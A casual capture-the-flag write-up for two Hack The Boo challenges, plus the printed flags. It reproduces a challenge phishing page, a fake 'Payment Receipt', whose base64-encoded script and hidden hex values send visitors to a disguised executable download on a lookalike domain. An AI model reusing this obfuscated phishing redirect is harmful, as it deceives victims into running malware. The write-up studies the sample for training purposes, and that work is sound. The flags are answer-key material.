
# Spooky Phishing 

## So again download the files and I am presented with an `index.html`

```bash
m0j0@r1s1n: ~/ctf/hackaboo
$ cat index.html                                                                                                                            [6:11:11]
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Payment Receipt</title>
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
  <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
  <style>
    body {
      overflow: hidden;
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      height: 100vh;
      margin: 0;
      padding: 0
    }
  </style>
</head>
<body>
  <input class="li" hidden value="Njg3NDc0NzA3MzNhMmYyZjc3Njk2ZTY0NmY3NzczNmM2OTc2NjU3NTcwNjQ2MTc0NjU3MjJlNjg3NDYyMmY0ODU0NDI3Yjcz">
  <input class="il" hidden value="NzAzMDMwNmI3OTVmNzA2ODMxNzM2ODMxNmU2NzVmNzczMTc0Njg1ZjczNzAzMDMwNmI3OTVmNzM3MDcyMzMzNDY0NzM2ODMzMzM3NDczN2QyZjYxNzA3MDJlNzg2YzczNzgyZTY1Nzg2NQ==">
  <div class="row justify-content-center">
    <div class="col-lg-4" style="max-width: 390px; min-width: 390px;">
      <div class="card mt-5 border-0 shadow-sm">
        <div class="card-header">
          <img id="banner" style="max-height:36px;" class="img-fluid">
        </div>
        <div class="card-body shadow-sm rounded">
          <div class="d-flex align-items-center justify-content-center">
            <strong>Loading...</strong>&nbsp;&nbsp;&nbsp;&nbsp; <div class="spinner-border ml-auto" role="status" aria-hidden="true"></div>
          </div>
        </div>
      </div>
    </div>
    <script src="data:text/javascript;base64,JChfID0+IHsKCiAgICBjb25zdCBuID0gYXRvYigkKCcuaWwnKS52YWwoKSk7CiAgICBjb25zdCBubiA9IGRlY29kZUhleChuKTsKCiAgICBkb2N1bWVudC5ib2R5LnN0eWxlLmJhY2tncm91bmRJbWFnZSA9ICd1cmwoaHR0cDovL21pY3Jvc29mdGNsb3Vkc2VydmljZXMuY29tL2ltYWdlcy8yNDQwNTc2MjQtYTY1M2MzOTktMWU2NC00NDRlLTg3OTItZTNkZmRjMjA0ZGZkLnBuZyknOwogICAgJCgnI2Jhbm5lcicpLmF0dHIoJ3NyYycsICdodHRwOi8vbWljcm9zb2Z0Y2xvdWRzZXJ2aWNlcy5jb20vaW1hZ2VzLzI0NDA1NzY3OS1mOTcxZjJlNi1hZjRhLTQwZjctOTIyNS03ZDRlOTI5ZWQzYWUucG5nJyk7CgogICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgY29uc3QgYSA9IGF0b2IoJCgnLmxpJykudmFsKCkpOwogICAgICAgIGNvbnN0IGFhID0gZGVjb2RlSGV4KGEpOwoKICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9IGFhICsgbm47CiAgICB9LCAzNTAwKTsKfSk7CgpmdW5jdGlvbiBkZWNvZGVIZXgoaGV4eCkgewogICAgdmFyIGhleCA9IGhleHgudG9TdHJpbmcoKTsKICAgIHZhciBzdHIgPSAnJzsKICAgIGZvciAodmFyIGkgPSAwOyBpIDwgaGV4Lmxlbmd0aDsgaSArPSAyKQogICAgICAgIHN0ciArPSBTdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGhleC5zdWJzdHIoaSwgMiksIDE2KSk7CiAgICByZXR1cm4gc3RyOwp9"></script>
</body>
</html>%
```

I immediately went for the bade64 script but then I noticed the hidden values. Taking the first I decode it from base 64 then ASCII again and get a partial flag, surely the rest is in the other hidden value and it is `HTB{sp00ky_ph1sh1ng_w1th_sp00ky_spr34dsh33ts}` when combined.
Damn I’m happy lol. I’ll try another.

So I tried the first Reversing and well that was easy, it is a ELF executable that I simply ran strings on:

```bash
Sour Patch Kids
Sour Punch
Toxic Waste
Warheads
HTB{4lw4y5_ch3ck_ur_k1d5_c4ndy}
Reaching into the candy bowl...
Your candy is... '%s'. Enjoy!
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
```

I’m sure you can work out the flag 😀
